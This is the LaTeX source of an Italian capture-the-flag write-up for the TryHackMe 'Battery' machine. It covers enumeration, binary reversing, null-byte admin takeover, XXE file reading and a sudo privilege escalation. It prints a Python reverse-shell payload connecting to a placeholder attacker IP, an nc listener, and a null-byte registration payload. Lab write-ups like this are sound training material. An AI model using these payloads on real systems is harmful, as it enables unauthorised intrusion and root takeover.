\documentclass[a4paper,11pt]{article}

\usepackage[margin=2.5cm]{geometry}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{setspace}
\usepackage{titlesec}

\onehalfspacing

\hypersetup{
    colorlinks=true,
    linkcolor=black,
    urlcolor=blue
}

\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10}
}

\title{\textbf{Penetration Test Report (OSCP Style)}\\Battery}
\author{Franco Salvucci}
\date{}

\begin{document}

\maketitle
\tableofcontents
\newpage

% --------------------------------------------------
\section{Informazioni sul Target}

\begin{itemize}
    \item Target: 10.112.175.27
    \item Ambiente: TryHackMe
\end{itemize}

% --------------------------------------------------
\section{Enumerazione}

\subsection{Port Scanning}

\begin{lstlisting}
nmap -sC -sV TARGET_IP
\end{lstlisting}

Porte aperte individuate:

\begin{itemize}
    \item 22/tcp – SSH
    \item 80/tcp – HTTP
\end{itemize}

% --------------------------------------------------
\subsection{Enumerazione Web}

Directory brute forcing:

\begin{lstlisting}
gobuster dir -u http://TARGET_IP \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html
\end{lstlisting}

Directory interessanti:

\begin{itemize}
    \item /register.php
    \item /admin.php
    \item /forms.php
    \item /report
\end{itemize}

% --------------------------------------------------
\section{Reverse Engineering}

\subsection{Analisi del binario}

Il file \texttt{/report} scarica un binario ELF.

\begin{lstlisting}
file report
\end{lstlisting}

Il binario viene aperto con Ghidra.

Nel main viene identificato confronto con credenziali hardcoded:

\begin{lstlisting}
guest:guest
\end{lstlisting}

Il binario contiene inoltre:
\begin{itemize}
    \item lista utenti
    \item funzione update password
\end{itemize}

% --------------------------------------------------
\section{Accesso Amministrativo}

\subsection{Null Byte Injection}

È stato intercettato il traffico di registrazione con Burp Suite.

Payload utilizzato:

\begin{lstlisting}
admin@bank.a%00
\end{lstlisting}

Registrando questo utente è possibile autenticarsi come admin.

% --------------------------------------------------
\section{XXE Exploitation}

\subsection{Identificazione vulnerabilità}

La pagina \texttt{/forms.php} processa XML input.

Il contenuto XML viene riflesso nella risposta.

% --------------------------------------------------
\subsection{Payload XXE}

È stato utilizzato payload XXE per leggere file locali.

File letti:
\begin{itemize}
    \item /etc/passwd
    \item file PHP applicativi
\end{itemize}

Dai file PHP vengono recuperate credenziali SSH.

% --------------------------------------------------
\section{Accesso SSH}

\begin{lstlisting}
ssh cyber@TARGET_IP
\end{lstlisting}

Accesso riuscito.

% --------------------------------------------------
\section{Privilege Escalation}

\subsection{Enumerazione sudo}

\begin{lstlisting}
sudo -l
\end{lstlisting}

Output:

\begin{lstlisting}
(root) NOPASSWD:
/usr/bin/python3 /home/cyber/run.py
\end{lstlisting}

% --------------------------------------------------
\subsection{Sfruttamento}

Il file \texttt{run.py} viene sostituito con payload reverse shell:

\begin{lstlisting}
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATT_IP",9001));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")
\end{lstlisting}

Listener:

\begin{lstlisting}
nc -lvnp 9001
\end{lstlisting}

Esecuzione:

\begin{lstlisting}
sudo /usr/bin/python3 /home/cyber/run.py
\end{lstlisting}

\textbf{Risultato: shell root ottenuta}

% --------------------------------------------------
\section{Proof of Compromise}

\subsection{User Flag}

\begin{lstlisting}
/home/cyber/flag1.txt
\end{lstlisting}

\subsection{Root Flag}

\begin{lstlisting}
/root/root.txt
\end{lstlisting}

% --------------------------------------------------
\section{Conclusioni}

Il sistema è stato compromesso tramite:
\begin{itemize}
    \item Reverse engineering
    \item Null byte injection
    \item XXE
    \item sudo misconfiguration
\end{itemize}

% --------------------------------------------------
\section{Note}

La macchina includeva anche un secondo metodo alternativo di privilege escalation non trattato in questo report.

\end{document}